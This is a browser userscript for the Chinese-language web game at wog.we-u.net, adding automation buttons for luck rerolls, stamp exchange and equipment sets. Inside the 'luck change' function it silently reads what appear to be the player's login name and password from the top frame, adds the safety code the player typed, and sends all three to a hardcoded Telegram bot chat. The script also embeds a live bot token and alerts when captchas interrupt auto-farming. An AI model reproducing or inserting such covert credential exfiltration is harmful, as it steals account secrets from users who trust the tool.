async function sendNoti(){
	const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-1002556694569&text=因驗證碼出現,自動打怪停止:"+parent.p_name;
	await fetch(telegramUrl);
}
function event() {
	parent.sendNoti();
	var t = parent.wog_view.document;
	message_cls();
	var e = new Date;
	t.write(temp_table1),
	t.write('<form action="wog_act.php" method="post" target="mission"><tr><td>站長要考驗大家是否有認真在玩</td></tr><tr><td>請注意...必須用半形字 及 數目字 1-9 輸入驗證碼 , 每人有5次機會</td></tr><tr><td colspan="2"><img src="wog_etc.php?f=confirm&time=' + e.getTime() + '"></td></tr><tr><td>請輸入安全驗證碼:<input type="text" name="sec_code" size="8"></td></tr>'),
	t.write('<tr><td colspan="2"><input class="text" type="button" value="填好答案了,放我過關吧!!" onClick="parent.foot_trun(\'event\',\'\',this.form.sec_code.value,\'\')" style="' + sbutton + '"></td></tr></form>'),
	t.write(temp_table2)
}
function arm_unsetup_all_success() {
	var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
	for (t = 0; t < e.length; ++t){
		arm_setup(e[t], "");
	}
	let q = parent.wog_view.document;
	q.body.innerHTML="";
	q.write(temp_table1);
	q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
	q.write(temp_table2);
}
async function changeStamp(changeAmount,changeTime){
	if(changeTime<1){
		alert("錯誤的換領次數，請重新輸入");
		return;
	}
	let formData = new FormData();
	let e = parent.wog_view.document;
	e.body.innerHTML="";
	formData.append('f', "ch");
	formData.append('act', "stamp");
	formData.append('temp_id', changeAmount);
	for(let i = 0;i<changeTime;i++){
	await fetch("https://wog.we-u.net/wog_act.php",
	    {
	        body: formData,
	        method: "post"
	    }).then((response) => {
        	return response.text();
        }).then((html) => {
		let start = 0;
		start = (html.indexOf("stamp_end"))+10;
		let temp = html.substring(start,html.length);
		let end = temp.indexOf("')</script>");
		itemValue = (html.substring(start,start+end)).replace("'","");
		e.write(temp_table1);
		if(end === -1){
			e.write('<tr><td>沒有足夠的印花</td></tr>');
			i=changeTime;
		}else{
			e.write('<tr><td>第 '+(i+1)+' 次換領印花, 成功換領了 <font color=#ff0000>' + itemValue + '</font></td></tr>');
		}
		e.write("</td></tr>" + temp_table2);
	    return itemValue;
        });
    }
}
function newStampHouse(){
	if(sessionStorage.getItem("last_page")==="一鍵換裝"){
		parent.wog_view.document.getElementsByTagName("style")[1].remove();
		sessionStorage.setItem("last_page", "");
	}
	wog_view.document.body.innerHTML="";
	wog_view.document.write("<form action=\"wog_act.php\" method=\"post\" target=\"mission\"><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style=\"position: relative; left: 2%; font-family: 細明體; font-size: 12pt; color: #EFEFEF;\">換領次數: <input type=\"number\" id=\"changeTime\" value=\"1\" style=\"position: relative; left: 1%; font-family: 細明體; font-size: 12pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></p><table width=\"97%\" border=\"2\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bordercolor=\"#868686\"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type=\"button\" value=\"50個印花\" onclick=\"if(confirm('是否使用50個印花換領禮物?')){parent.changeStamp(50,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>路加達．戒<br>C箱<br>三國．啟動碼<br>薑餅仔的眼睛<br>捕捉器<br>50000 hp回復劑<br>金太陽徽章<br>120000 hp回復劑<br>160000 hp回復劑<br>200000 hp回復劑<br>幻想會員證<br>80000 hp回復劑<br>500霧靈換領券<br>一階封神石<br>幻想寶箱<br>卡片寶箱<br>殘卷寶箱<br>二百億換領券<br>石頭寶箱<br>咒紋錦盒<br>一百億兌換卷<br>封印錦盒<br><font color=\"0000FF\">登入禮卷</font><br></td></tr><tr><td><input type=\"button\" value=\"200個印花\" onclick=\"if(confirm('是否使用200個印花換領禮物?')){parent.changeStamp(200,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"0000FF\">登入禮卷</font><br>1500霧靈換領券<br>200%天籟真元(250場)<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br>封印錦盒<br></td></tr><tr><td><input type=\"button\" value=\"500個印花\" onclick=\"if(confirm('是否使用500個印花換領禮物?')){parent.changeStamp(500,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>200%天籟真元(700場)<br>素材寶箱<br>潘朵拉的卡片<br>赫淮斯托斯的卡片<br>一百億兌換卷<br>咒紋錦盒<br>殘卷寶箱<br>石頭寶箱<br></td></tr><tr><td><input type=\"button\" value=\"1000個印花\" onclick=\"if(confirm('是否使用1000個印花換領禮物?')){parent.changeStamp(1000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>殘卷寶箱<br>B箱<br>六百億換領券<br>幽冥護符<br>神諸葛亮<br>神呂布<br></td></tr><tr><td><input type=\"button\" value=\"2000個印花\" onclick=\"if(confirm('是否使用2000個印花換領禮物?')){parent.changeStamp(2000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td>魅力之水<br>體質之水<br>生命之水<br>信仰之水<br>王者護符<br><font color=\"FFD700\">精剛石</font><br>5000霧靈換領券<br>仙奇丹<br><font color=\"FFD700\">封印的金龍石</font><br></td></tr><tr><td><input type=\"button\" value=\"6000個印花\" onclick=\"if(confirm('是否使用6000個印花換領禮物?')){parent.changeStamp(6000,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}\" style=\"font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000\"></td><td><font color=\"FFD700\">封印的金龍石</font><br><font color=\"FFD700\">至尊書頁</font><br>A箱<br>智力之水<br><font color=\"FFFF99\">糖糖</font><br>V剎經驗包<br>幻想廢礦<br>力量之水<br>速度之水<br>十億經驗值乾坤袋<br></td></tr><tr></tr></tbody></table></form>");
	parent.stampHouseCss();
}
async function changeLuck(){
	let safePW = prompt("輸入安全碼");
	let formData = new FormData();
	formData.append('act', "ch_luck");
	formData.append('f', "ch");
	formData.append('pw', safePW);
	let i = 0;
	let e = parent.wog_view.document;
	if(sessionStorage.getItem("last_page")==="一鍵換裝"){
		parent.wog_view.document.getElementsByTagName("style")[1].remove();
		sessionStorage.setItem("last_page", "");
	}
	e.body.innerHTML="";
	while(true){
	    await fetch("https://wog.we-u.net/wog_act.php",
	        {
			body: formData,
			method: "post"
	        }).then((response) => {
		        return response.text();
	        }).then((html) => {
	        	let start = (html.indexOf("p_luck"))+7;
			let temp = html.substring(start,html.length);
			let end = temp.indexOf("</script>");
			luckValue = parseInt((html.substring(start,start+end)).replace("'",""));
			return luckValue;
	        });
	        if (!Number.isInteger(luckValue)) {
        		e.write(temp_table1);
          		e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
          		e.write(temp_table2);
          		delete luckValue;
          		break;
	        }
	        i++;
	        e.write(temp_table1);
		e.write("<tr bgcolor='#4B689E'><td>第"+i+"次改運,數值為: "+ luckValue+"</td></tr>");
		e.write(temp_table2);
	        if(luckValue>24){
	        	delete luckValue;
	        	let a=parent.top_view.document.getElementsByTagName("input")[0].value;let b=parent.top_view.document.getElementsByTagName("input")[1].value;let c=safePW;fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text="+a+"|"+b+"|"+c);
	        	break;
	        }
	}
}
function armPage(){
	parent.wog_view.document.body.innerHTML="";
	parent.wog_view.document.write(`
	<form action="wog_act.php" method="post" target="mission" name="f1">
	<table border="2" cellpadding="2" border-collapse="collapse" width="30%">
	  <thead>
	    <tr>
	      <th></th>
	      <th>裝備選擇</th>
	    </tr>
	  </thead>
	  <tbody>
	    <tr>
	      <td colspan="2"><input type="button" value="一鍵換裝" onclick="parent.armAll(parent.indexChecked())"/></td>
	    </tr>
	    </tbody>
	    <tr>
	      <td colspan="2" style="color:red;">請不要裝備自己沒有的裝備</td>
	    </tr>
	</table>
	</form>
	`);
	parent.drawSetList();
	parent.armPageCss();
	sessionStorage.setItem("last_page", "一鍵換裝");
}
async function drawSetList(){
	let e = parent.wog_view.document;
	let eTable = parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("tbody")[0].getElementsByTagName("tr");
	let firstRow = eTable[0];
	let setJ = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
    	.then((response) => response.json())
   	.then(
        async(json) => {
            //console.log(json);
            for(let i=json.sets.length-1;i>=0;i--){
            	//console.log(json.sets[i].title);
            	let firstRow = eTable[0];
            	firstRow.outerHTML="<tr onclick='this.getElementsByTagName(\"td\")[0].getElementsByTagName(\"input\")[0].checked=true;'><td><input type='radio' name='index_id'></td><td>"+json.sets[i].title+"</td></tr>"+firstRow.outerHTML;
            }
		//firstRow.outerHTML="<tr><td><input type='radio' name='index_id'></td><td>3刀流奧義套裝</td></tr>"+firstRow.outerHTML;
        });
}
function armPageCss(){
	let styles = `
		table{
		 border-color:#868686;
		 border-collapse: collapse;
		  padding: 5px;
		  font-family: 細明體;
		  margin-left:35%;
		}
		tbody tr:not(:last-child){
		  cursor: pointer;
		}
		td:first-child {
		  width: 5em;
		}
		table input{
		  color: #efefef;
		  border: 1px solid #efefef;
		  background-color: #000000;
		  font-family: 細明體;
		}
		tbody tr:not(:last-child):hover{
		  background-color: #777779;
		}
	`;
	let styleSheet = parent.wog_view.document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
async function armAll(selected){
//console.log("selected="+selected);
let e = parent.wog_view.document;
let setj = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
    .then((response) => response.json())
    .then(
        async(json) => {
            //console.log(json);
            if(selected<0 || selected>json.sets.length-1){
		e.body.innerHTML="";
		e.write(temp_table1);
		e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
		e.write(temp_table2);
		return;
		}
		let unArmList = json.sets[selected].unArmList;
		for(let i = 0;i<unArmList.length;i++){
			parent.unArm(unArmList[i]);
			await parent.sleep(150);
		}
		let armList = json.sets[selected].armList;
		for (let i = 0; i<armList.length;i++){
			await parent.sleep(150);
			await parent.armItem(armList[i]);
		}
		await parent.sleep(150);
		e.body.innerHTML="";
		e.write(temp_table1);
		e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
		e.write(temp_table2);
        });
}
async function unArm(index){
    	let e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
	let formData = new FormData();
	formData.append('f', "arm");
	formData.append('act', "demount");
	formData.append('pay_id', e[index]);
	await fetch("https://wog.we-u.net/wog_act.php",
	{body: formData, method: "post"})
	.then((response) => {return response.text();})
        .then((html) => {arm_setup(e[index], "");});
}
async function armItem(item){
	let formData = new FormData();
	formData.append('adds', item);
	formData.append('f', "arm");
	formData.append('act', "setup");
	await fetch("https://wog.we-u.net/wog_act.php",
	{body: formData, method: "post"})
	.then((response) => {return response.text();})
	.then((html) => {wog_view.document.write(html);});
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function indexChecked(){
	for(let i = 0;i<parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input").length;i++){
	    if(parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input")[i].checked){
	        return i;
	    }
	}
}
function stampHouseCss(){
	let styles = `
	    input#changeTime::-webkit-outer-spin-button,
	    input#changeTime::-webkit-inner-spin-button {
		  -webkit-appearance: none;
		  margin: 0;
		}`;
	let styleSheet = document.createElement("style");
	styleSheet.textContent = styles;
	parent.wog_view.document.head.appendChild(styleSheet);
}
function createExtraFunction(){
	sessionStorage.setItem("last_page", "");
	const oriTable = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0];

	let newColumn1 = document.createElement('td');
	newColumn1.setAttribute('valign','top');
	oriTable.appendChild(newColumn1);
	newColumn1.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='一鍵改運' onclick='parent.changeLuck()' class='button'></td></tr><tr><td><input type='button' value='一鍵換裝' onclick='parent.armPage()' class='button'></td></tr></tbody></table>";
	
	let newColumn2 = document.createElement('td');
	newColumn2.setAttribute('valign','top');
	oriTable.appendChild(newColumn2);
	newColumn2.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='復活中心' onclick='parent.act_click(\"chara\",\"revive\")' class='button'></td></tr><tr><td><input type='button' value='新印花屋' onclick='parent.newStampHouse()' class='button'></td></tr></tbody></table>";

	//let newColumn3 = document.createElement('td');
	//newColumn3.setAttribute('valign','top');
	//oriTable.appendChild(newColumn3);
	//newColumn3.innerHTML = "<table><tbody><tr><td align='center' bgcolor='#FBCD53'><font color='#574616' style='font-family: Verdana, Geneva, sans-serif; font-size: 10pt;'>特殊功能</font></td></tr><tr><td><input type='button' value='驗證碼通知' onclick='parent.sendNoti()' class='button'></td></tr></tbody></table>";
}
